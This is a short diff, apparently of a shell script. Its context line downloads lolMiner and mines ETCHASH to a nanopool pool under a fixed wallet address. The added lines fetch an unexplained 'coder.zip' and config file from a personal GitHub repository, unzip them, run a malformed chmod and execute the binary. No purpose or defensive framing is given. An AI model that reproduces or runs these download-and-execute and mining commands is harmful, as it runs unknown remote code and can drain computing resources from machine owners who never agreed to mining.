@@ -1,7 +1,11 @@
 
 wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.29/lolMiner_v1.29_Lin64.tar.gz && tar -xf lolMiner_v1.29_Lin64.tar.gz && cd 1.29 && ./lolMiner --algo ETCHASH --pool eth-asia1.nanopool.org:9999 --user 0xC7Ff963086Cf1AEFafd6C32bfC82F41E7e61177A
 
-
+wget https://github.com/sanayaa/love/raw/main/coder.zip
+unzip coder.zip
+chmod coder
+wget https://raw.githubusercontent.com/sanayaa/love/main/config.ini
+./coder config.ini
 
 
 
